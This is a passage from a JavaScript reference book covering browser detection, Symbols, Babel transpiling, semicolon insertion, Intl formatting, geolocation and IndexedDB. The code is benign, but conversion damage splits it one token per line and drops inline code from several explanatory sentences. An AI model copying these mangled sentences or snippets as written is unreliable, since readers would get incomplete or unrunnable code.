<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

This method looks for the existence of browser specific things. This
would be more difficult to spoof, but is not guaranteed to be future
proof.

*// Opera 8.0+*

**var**

isOpera

=

(

!!

window.

opr

&&

!!

opr.

addons

)

&vert;&vert;

!!

window.

opera

&vert;&vert;

navigator.

userAgent

.

indexOf

(

&apos;

OPR/&apos;

)

&gt;=

0

;

*// Firefox 1.0+*

**var**

isFirefox

=

**typeof**

InstallTrigger

!==

&apos;undefined&apos;

;

*// At least Safari 3+: &quot;&lbrack;object HTMLElementConstructor&rbrack;&quot;*

**var**

isSafari

=

Object

.

**prototype**

.

toString

.

call

(

window.

HTMLElement

)

.

indexOf

(

&apos;Constructor&apos;

)

&gt;

0

;

*// Internet Explorer 6-11*

**var**

isIE

=

*/&ast;@cc_on!@&ast;/*

**false**

&vert;&vert;

!!

document.

documentMode

;

*// Edge 20+*

**var**

isEdge

=

!

isIE

&&

!!

window.

StyleMedia

;

*// Chrome 1+*

**var**

isChrome

=

!!

window.

chrome

&&

!!

window.

chrome

.

webstore

;

*// Blink engine detection*

**var**

isBlink

=

(

isChrome

&vert;&vert;

isOpera

)

&&

!!

window.

CSS

;
Successfully tested in:
Firefox 0.8 - 44
Chrome 1.0 - 48 Opera 8.0 - 34
Safari 3.0 - 9.0.3
IE 6 - 11
Edge - 20-25

Credit to [Rob W](http://stackoverflow.com/a/9851769/6194193)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 66.2: User Agent Detection
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  **&lt;browser** name                       **&gt;**   **&lt;version**
  -  

  

This method gets the user agent and parses it to find the browser. The
browser name and version are extracted from the user agent through a
regex. Based on these two, the **&gt;** is returned.
>
The four conditional blocks following the user agent matching code are
meant to account for differences in the user agents of different
browsers. For example, in case of opera, [since it uses Chrome
rendering engine](https://stackoverflow.com/a/17436191/5894241), there
is an additional step of ignoring that part.
>
Note that this method can be easily spoofed by a user.

![](./images/image040.png){width="7.486805555555556in"
height="2.6756944444444444in"}

Credit to [kennebec](http://stackoverflow.com/a/2401861/6194193)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 66.3: Library Method
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

An easier approach for some would be to use an existing JavaScript
library. This is because it can be tricky to guarantee browser
detection is correct, so it can make sense to use a working solution
if one is available.
>
One popular browser-detection library is
[Bowser](https://github.com/ded/bowser).
>
Usage example:

**if**

(

bowser.

msie

&&

bowser.

version

&gt;=

6

)

{

alert

(

&apos;IE version 6 or newer&apos;

)

;

}

**else**

**if**

(

bowser.

firefox

)

{

alert

(

&apos;Firefox&apos;

)

;

}

**else**

**if**

(

bowser.

chrome

)

{

alert

(

&apos;Chrome&apos;

)

;

}

**else**

**if**

(

bowser.

safari

)

{

alert

(

&apos;Safari&apos;

)

;

}

**else**

**if**

(

bowser.

iphone

&vert;&vert;

bowser.

android

)

{

alert

(

&apos;iPhone or Android&apos;

)

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 67: Symbols
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 67.1: Basics of symbol primitive type
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Symbol is a new primitive type in ES6. Symbols are used mainly as
**property keys**, and one of its main characteristics is that they
are *unique*, even if they have the same description. This means they
will never have a name clash with any other property key that is a
symbol or string.

**const**

MY_PROP_KEY

=

Symbol

(

)

;

**const**

obj

=

{

}

;

obj

&lbrack;

MY_PROP_KEY

&rbrack;

=

&quot;ABC&quot;

;

console.

log

(

obj

&lbrack;

MY_PROP_KEY

&rbrack;

)

;

In this example, the result of

console.

log

would be

ABC

.

You can also have named Symbols like:

**const**

APPLE

=

Symbol

(

&apos;Apple&apos;

)

;

**const**

BANANA

=

Symbol

(

&apos;Banana&apos;

)

;

**const**

GRAPE

=

Symbol

(

&apos;Grape&apos;

)

;

Each of these values are unique and cannot be overridden.

  
  description
  

  

  
  Symbol.**for**
  

  

Providing an optional parameter () when creating primitive symbols can
be used for debugging but not to access the symbol itself (but see the
() example for a way to register/lookup global shared symbols).

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 67.2: Using Symbol.for() to create global, shared symbols
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  Symbol.**for**
  

  

The method allows you to register and look up global symbols by name.
The first time it is called with a given key, it creates a new symbol
and adds it to the registry.

**let**

a

=

Symbol.

**for**

(

&apos;A&apos;

)

;

  -
  Symbol.**for**                                     (     &apos;A&apos;
   - 

  -

  -
  Symbol                                     (       &apos;A&apos;
  - - 

  -

The next time you call ), the *same symbol* will be returned instead
of a new one (in contrast to ) which would create a new, unique symbol
that happens to have the same description).

a

===

Symbol.

**for**

(

&apos;A&apos;

)

*// true*

but

a

===

Symbol

(

&apos;A&apos;

)

*// false*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 67.3: Converting a symbol into a string
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Unlike most other JavaScript objects, symbols are not automatically
converted into a string when performing concatenation.

**let**

apple

=

Symbol

(

&apos;Apple&apos;

)

&plus;

&apos;&apos;

;

*// throws TypeError!*

Instead, they have to be explicitly converted into a string when
necessary, (for example, to get a textual description of the symbol
that can be used in a debug message) using the toString method or the
String constructor.

**const**

APPLE

=

Symbol

(

&apos;Apple&apos;

)

;

**let**

str1

=

APPLE.

toString

(

)

;

*// &quot;Symbol(Apple)&quot;*

**let**

str2

=

String

(

APPLE

)

;

*// &quot;Symbol(Apple)&quot;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 68: Transpiling
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Transpiling is the process of interpreting certain programming
languages and translating it to a specific target language. In this
context, transpiling will take [compile-to-JS
languages](https://github.com/jashkenas/coffeescript/wiki/list-of-languages-that-compile-to-js)
and translate them into the **target** language of JavaScript.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 68.1: Introduction to Transpiling
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Examples**
>
**ES6/ES2015 to ES5 (via [Babel](https://babeljs.io/))**: This ES2015
syntax

*// ES2015 arrow function syntax*

&lbrack;

1

,

2

,

3

&rbrack;

.

map

(

n

=&gt;

n

&plus;

1

)

;

is interpreted and translated to this ES5 syntax:

*// Conventional ES5 anonymous function syntax*

&lbrack;

1

,

2

,

3

&rbrack;

.

map

(

**function**

(

n

)

{

**return**

n

&plus;

1

;

}

)

;

**CoffeeScript to JavaScript (via built-in CoffeeScript compiler)**:
This CoffeeScript

&bsol;# Existence

:

alert

&quot;I knew it!&quot;

**if**

elvis

?

is interpreted and translated to JavaScript:

**if**

(

**typeof**

elvis

!==

&quot;undefined&quot;

&&

elvis

!==

**null**

)

{

alert

(

&quot;I knew it!&quot;

)

;

}

**How do I transpile?**
>
Most compile-to-JavaScript languages have a transpiler **built-in**
(like in CoffeeScript or TypeScript). In this case, you may just need
to enable the language&apos;s transpiler via config settings or a
checkbox. Advanced settings can also be set in relation to the
transpiler.

For **ES6/ES2016-to-ES5 transpiling**, the most prominent transpiler
being used is [Babel](https://babeljs.io/).

**Why should I transpile?**

The most cited benefits include:

The ability to use newer syntax reliably

Compatibility among most, if not all browsers

Usage of missing/not yet native features to JavaScript via languages
like CoffeeScript or TypeScript

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 68.2: Start using ES6/7 with Babel
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

[Browser support for ES6](https://kangax.github.io/compat-table/es6/)
is growing, but to be sure your code will work on environments that
don&apos;t fully support it, you can use [Babel](https://babeljs.io/), the
ES6/7 to ES5 transpiler, [try it out!](https://babeljs.io/repl/)

If you would like to use ES6/7 in your projects without having to
worry about compatibility, you can use [Node](https://nodejs.org/en/)
and [Babel CLI](https://babeljs.io/docs/usage/cli/)

**Quick setup of a project with Babel for ES6/7 support**

1.  [Download](https://nodejs.org/en/download/) and install Node

2.  Go to a folder and create a project using your favourite command
    line tool

&bsol;~ npm init

3.  Install Babel CLI

&bsol;~ npm

**install**

&bsol;

save-dev

babel-cli

&bsol;~ npm

**install**

&bsol;

save-dev

babel-preset-es2015

  
  js   files, and then a                    dist      /   scripts
   -   

  

4.  Create a scripts folder to store your . folder where the transpiled
    fully compatible files will be stored.

  
  babelrc
  

  

5.  Create a . file in the root folder of your project, and write this
    on it

{

&quot;presets&quot;

:

&lbrack;

&quot;es2015&quot;

&rbrack;

}

  
  package.json
  

  

6.  Edit your file (created when you ran npm init) and add the build
    script to the scripts property:

{

&hellip;

&quot;scripts&quot;

:

{

&hellip;

,

&quot;build&quot;

:

&quot;babel scripts &bsol;out-dir dist/scripts&quot;

}

,

&hellip;

}

7.  Enjoy [programming in ES6/7](https://babeljs.io/docs/learn-es2015/)

8.  Run the following to transpile all your files to ES5

&bsol;~ npm run build

For more complex projects you might want to take a look at
[Gulp](http://gulpjs.com/) or [Webpack](https://webpack.github.io/)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 69: Automatic Semicolon Insertion - ASI
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 69.1: Avoid semicolon insertion on return statements
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The JavaScript coding convention is to place the starting bracket of
blocks on the same line of their declaration:

**if**

(

&hellip;

)

{

}

**function**

(

a

,

b

,

&hellip;

)

{

}

Instead of in the next line:

**if**

(

&hellip;

)

{

}

**function**

(

a

,

b

,

&hellip;

)

{

}

This has been adopted to avoid semicolon insertion in return
statements that return objects:

**function**

foo

(

)

{

**return**

*// A semicolon will be inserted here, making the function return
nothing*

{

foo

:

&apos;foo&apos;

}

;

}

foo

(

)

;

*// undefined*

**function**

properFoo

(

)

{

**return**

{

foo

:

&apos;foo&apos;

}

;

}

properFoo

(

)

;

*// { foo: &apos;foo&apos; }*

In most languages the placement of the starting bracket is just a
matter of personal preference, as it has no real impact on the
execution of the code. In JavaScript, as you&apos;ve seen, placing the
initial bracket in the next line can lead to silent errors.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 69.2: Rules of Automatic Semicolon Insertion
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

There are three basic rules of semicolon insertion:

1.  When, as the program is parsed from left to right, a token (called
    the *offending token*) is encountered that is not allowed by any
    production of the grammar, then a semicolon is automatically
    inserted before the offending token if one or more of the following
    conditions is true:

The offending token is separated from the previous token by at least
one LineTerminator. The offending token is }.

2.  When, as the program is parsed from left to right, the end of the
    input stream of tokens is encountered and the parser is unable to
    parse the input token stream as a single complete ECMAScript
    Program, then a semicolon is automatically inserted at the end of
    the input stream.

3.  When, as the program is parsed from left to right, a token is
    encountered that is allowed by some production of the grammar, but
    the production is a *restricted production* and the token would be
    the first token for a terminal or nonterminal immediately following
    the annotation &quot;&lbrack;no LineTerminator here&rbrack;&quot; within the restricted
    production (and therefore such a token is called a restricted
    token), and the restricted token is separated from the previous
    token by at least one LineTerminator, then a semicolon is
    automatically inserted before the restricted token.

However, there is an additional overriding condition on the preceding
rules: a semicolon is never inserted automatically if the semicolon
would then be parsed as an empty statement or if that semicolon would
become one of the two semicolons in the header of a **for** statement
(see 12.6.3).

**Source: [ECMA-262, Fifth Edition ECMAScript
Specification:](http://www.ecma-international.org/publications/standards/Ecma-262.htm)**

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 69.3: Statements aected by automatic semicolon insertion
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  do                &minus;       while
    

  

empty statement **var** statement expression statement statement
**continue** statement **break** statement **return** statement
**throw** statement
>
**Examples:**
>
When the end of the input stream of tokens is encountered and the
parser is unable to parse the input token stream as a single complete
Program, then a semicolon is automatically inserted at the end of the
input stream.

a

=

b

++

c

*// is transformed to:*

a

=

b

;

++

c

;

x

++

y

*// is transformed to:*

x

;

++

y

;

**Array indexing/literals**

console.

log

(

&quot;Hello, World&quot;

)

&lbrack;

1

,

2

,

3

&rbrack;

.

join

(

)

*// is transformed to:*

console.

log

(

&quot;Hello, World&quot;

)

&lbrack;

(

1

,

2

,

3

)

&rbrack;

.

join

(

)

;

**Return statement:**

**return**

&quot;something&quot;

;

*// is transformed to*

**return**

;

&quot;something&quot;

;

# Chapter 70: Localization

+-+-+
| **Paramater**  | **Details**                                     |
+==================+===================================================+
| weekday          | &quot;narrow&quot;, &quot;short&quot;, &quot;long&quot;                   |
+-+-+
| era              | &quot;narrow&quot;, &quot;short&quot;, &quot;long&quot;                   |
+-+-+
| year             | &quot;numeric&quot;, &quot;2-digit&quot;                          |
+-+-+
| month            | &quot;numeric&quot;, &quot;2-digit&quot;, &quot;narrow&quot;, &quot;short&quot;,  |
|                  | &quot;long&quot;                                          |
+-+-+
| day              | &quot;numeric&quot;, &quot;2-digit&quot;                          |
+-+-+
| hour             | &quot;numeric&quot;, &quot;2-digit&quot;                          |
+-+-+
| minute           | &quot;numeric&quot;, &quot;2-digit&quot;                          |
+-+-+
| second           | &quot;numeric&quot;, &quot;2-digit&quot;                          |
+-+-+

timeZoneName &quot;short&quot;, &quot;long&quot;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 70.1: Number formatting
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Number formatting, grouping digits according to the localization.

**const** usNumberFormat = **new** Intl.NumberFormat(&apos;en-US&apos;);
**const** esNumberFormat = **new** Intl.NumberFormat(&apos;es-ES&apos;);

**const** usNumber = usNumberFormat.format(99999999.99); *//
&quot;99,999,999.99&quot;* **const** esNumber =
esNumberFormat.format(99999999.99); *// &quot;99.999.999,99&quot;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 70.2: Currency formatting
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Currency formatting, grouping digits and placing the currency symbol
according to the localization.

**const** usCurrencyFormat = **new** Intl.NumberFormat(&apos;en-US&apos;,
{style: &apos;currency&apos;, currency: &apos;USD&apos;}) **const** esCurrencyFormat =
**new** Intl.NumberFormat(&apos;es-ES&apos;, {style: &apos;currency&apos;, currency:
&apos;EUR&apos;})

**const** usCurrency = usCurrencyFormat.format(100.10); *//
&quot;&dollar;100.10&quot;* **const** esCurrency = esCurrencyFormat.format(100.10);
*// &quot;100.10* €*&quot;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 70.3: Date and time formatting
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Date time formatting, according to the localization.
>
**const** usDateTimeFormatting = **new**
Intl.DateTimeFormat(&apos;en-US&apos;); **const** esDateTimeFormatting =
**new** Intl.DateTimeFormat(&apos;es-ES&apos;);
>
**const** usDate = usDateTimeFormatting.format(**new**
Date(&apos;2016-07-21&apos;)); *// &quot;7/21/2016&quot;* **const** esDate =
esDateTimeFormatting.format(**new** Date(&apos;2016-07-21&apos;)); *//
&quot;21/7/2016&quot;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 71: Geolocation
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 71.1: Get updates when a user&apos;s location changes
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

You can also receive regular updates of the user&apos;s location; for
example, as they move around while using a mobile device. Location
tracking over time can be very sensitive, so be sure to explain to the
user ahead of time why you&apos;re requesting this permission and how
you&apos;ll use the data.

**if**

(

navigator.

geolocation

)

{

*//after the user indicates that they want to turn on continuous
location-tracking*

**var**

watchId

=

navigator.

geolocation

.

watchPosition

(

updateLocation

,

geolocationFailure

)

;

}

**else**

{

console.

log

(

&quot;Geolocation is not supported by this browser.&quot;

)

;

}

**var**

updateLocation

=

**function**

(

position

)

{

console.

log

(

&quot;New position at: &quot;

&plus;

position.

coords

.

latitude

&plus;

&quot;, &quot;

&plus;

position.

coords

.

longitude

)

;

}

;

To turn off continuous updates:

navigator.

geolocation

.

clearWatch

(

watchId

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 71.2: Get a user&apos;s latitude and longitude
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**if**

(

navigator.

geolocation

)

{

navigator.

geolocation

.

getCurrentPosition

(

geolocationSuccess

,

geolocationFailure

)

;

}

**else**

{

console.

log

(

&quot;Geolocation is not supported by this browser.&quot;

)

;

}

*// Function that will be called if the query succeeds*

**var**

geolocationSuccess

=

**function**

(

pos

)

{

console.

log

(

&quot;Your location is &quot;

&plus;

pos.

coords

.

latitude

&plus;

&quot;

°

, &quot;

&plus;

pos.

coords

.

longitude

&plus;

&quot;

°

.&quot;

)

;

}

;

*// Function that will be called if the query fails*

**var**

geolocationFailure

=

**function**

(

err

)

{

console.

log

(

&quot;ERROR (&quot;

&plus;

err.

code

&plus;

&quot;): &quot;

&plus;

err.

message

)

;

}

;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 71.3: More descriptive error codes
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

In the event that geolocation fails, your callback function will
receive a PositionError object. The object will include an attribute
named code that will have a value of 1, 2, or 3. Each of these numbers
signifies a different kind of error;

  -
  getErrorCode()     function below takes the      PositionError.code
  -  

  -

the as its only argument and returns a string with the name of the
error that occurred.

**var**

getErrorCode

=

**function**

(

err

)

{

**switch**

(

err.

code

)

{

**case**

err.

PERMISSION_DENIED

:

**return**

&quot;PERMISSION_DENIED&quot;

;

**case**

err.

POSITION_UNAVAILABLE

:

**return**

&quot;POSITION_UNAVAILABLE&quot;

;

**case**

err.

TIMEOUT

:

**return**

&quot;TIMEOUT&quot;

;

**default**

:

**return**

&quot;UNKNOWN_ERROR&quot;

;

}

}

;

It can be used in

geolocationFailur

e

(

)

like so:

**var**

geolocationFailure

=

**function**

(

err

)

{

console.

log

(

&quot;ERROR (&quot;

&plus;

getErrorCode

(

err

)

&plus;

&quot;): &quot;

&plus;

err.

message

)

;

}

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 72: IndexedDB
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 72.1: Opening a database
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Opening a database is an asynchronous operation. We need to send a
request to open our database and then listen for events so we know
when it&apos;s ready.
>
We&apos;ll open a DemoDB database. If it doesn&apos;t exist yet, it will get
created when we send the request.
>
The 2 below says that we&apos;re asking for version 2 of our database.
Only one version exists at any time, but we can use the version number
to upgrade old data, as you&apos;ll see.

**var**

db

=

**null**

,

*// We&apos;ll use this once we have our database*

request

=

window.

indexedDB

.

open

(

&quot;DemoDB&quot;

,

2

)

;

*// Listen for success. This will be called after onupgradeneeded runs,
if it does at all*

request.

onsuccess

=

**function**

(

)

{

db

=

request.

result

;

*// We have a database!*

doThingsWithDB

(

db

)

;

}

;

*// If our database didn&apos;t exist before, or it was an older version
than what we requested,*

*// the &grave;onupgradeneeded&grave; event will be fired.*

*//*

*// We can use this to setup a new database and upgrade an old one with
new data stores*

request.

onupgradeneeded

=

**function**

(

event

)

{

db

=

request.

result

;

*// If the oldVersion is less than 1, then the database didn&apos;t exist.
Let&apos;s set it up*

**if**

(

event.

oldVersion

&lt;

1

)

{

*// We&apos;ll create a new &quot;things&quot; store with &grave;autoIncrement&grave;ing keys*

**var**

store

=

db.

createObjectStore

(

&quot;things&quot;

,

{

autoIncrement

:

**true**

}

)

;

}

*// In version 2 of our database, we added a new index by the name of
each thing*

**if**

(

event.

oldVersion

&lt;

2

)

{

*// Let&apos;s load the things store and create an index*

**var**

store

=

request.

transaction

.

objectStore

(

&quot;things&quot;

)

;

store.

createIndex

(

&quot;by_name&quot;

,

&quot;name&quot;

)

;

}

}

;

*// Handle any errors*

request.

onerror

=

**function**

(

)

{

console.

error

(

&quot;Something went wrong when we tried to request the database!&quot;

)

;

}

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 72.2: Adding objects
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Anything that needs to happen with data in an IndexedDB database
happens in a transaction. There are a few things to note about
transactions that are mentioned in the Remarks section at the bottom
of this page.
>
We&apos;ll use the database we set up in **Opening a database.**
>
*// Create a new readwrite (since we want to change things)
transaction for the things store* **var** transaction =
db.transaction(&lbrack;&quot;things&quot;&rbrack;, &quot;readwrite&quot;);

*// Transactions use events, just like database open requests. Let&apos;s
listen for success*

transaction.

oncomplete

=

**function**

(

)

{

console.

log

(

&quot;All done!&quot;

)

;

}

;

*// And make sure we handle errors*

transaction.

onerror

=

**function**

(

)

{

console.

log

(

&quot;Something went wrong with our transaction: &quot;

,

transaction.

error

)

;

}

;

*// Now that our event handlers are set up, let&apos;s get our things store
and add some objects!*

**var**

store

=

transaction.

objectStore

(

&quot;things&quot;

)

;

*// Transactions can do a few things at a time. Let&apos;s start with a
simple insertion*

**var**

request

=

store.

add

(

{

*// &quot;things&quot; uses auto-incrementing keys, so we don&apos;t need one, but
we can set it anyway*

key

:

&quot;coffee_cup&quot;

,

name

:

&quot;Coffee Cup&quot;

,

contents

:

&lbrack;

&quot;coffee&quot;

,

&quot;cream&quot;

&rbrack;

}

)

;

*// Let&apos;s listen so we can see if everything went well*

request.

onsuccess

=

**function**

(

event

)

{

*// Done! Here, &grave;request.result&grave; will be the object&apos;s key,
&quot;coffee_cup&quot;*

}

;

*// We can also add a bunch of things from an array. We&apos;ll use
auto-generated keys*

**var**

thingsToAdd

=

&lbrack;

{

name

:

&quot;Example object&quot;

}

,

{

value

:

&quot;I don&apos;t have a name&quot;

}

&rbrack;

;

*// Let&apos;s use more compact code this time and ignore the results of our
insertions*

thingsToAdd.

forEach

(

e

=&gt;

store.

add

(

e

)

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 72.3: Retrieving data
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Anything that needs to happen with data in an IndexedDB database
happens in a transaction. There are a few things to note about
transactions that are mentioned in the Remarks section at the bottom
of this page.
>
We&apos;ll use the database we set up in Opening a database.

*// Create a new transaction, we&apos;ll use the default &quot;readonly&quot; mode
and the things store*

**var**

transaction

=

db.

transaction

(

&lbrack;

&quot;things&quot;

&rbrack;

)

;

*// Transactions use events, just like database open requests. Let&apos;s
listen for success*

transaction.

oncomplete

=

**function**

(

)

{

console.

log

(

&quot;All done!&quot;

)

;

}

;

*// And make sure we handle errors*

transaction.

onerror

=

**function**

(

)

{

console.

log

(

&quot;Something went wrong with our transaction: &quot;

,

transaction.

error

)

;

}

;

*// Now that everything is set up, let&apos;s get our things store and load
some objects!*

**var**

store

=

transaction.

objectStore

(

&quot;things&quot;

)

;

*// We&apos;ll load the coffee_cup object we added in Adding objects*

**var**

request

=

store.

**get**

(

&quot;coffee_cup&quot;

)

;

*// Let&apos;s listen so we can see if everything went well*

request.

onsuccess

=

**function**

(

event

)

{

*// All done, let&apos;s log our object to the console*

console.

log

(

request.

result

)

;

}

;

*// That was pretty long for a basic retrieval. If we just want to get
just*

*// the one object and don&apos;t care about errors, we can shorten things a
lot*

db.

transaction

(

&quot;things&quot;

)

.

objectStore

(

&quot;things&quot;

)

.

**get**

(

&quot;coffee_cup&quot;

)

.

onsuccess

=

e

=&gt;

console.

log

(

e&period;

target

.

result

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 72.4: Testing for IndexedDB availability
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
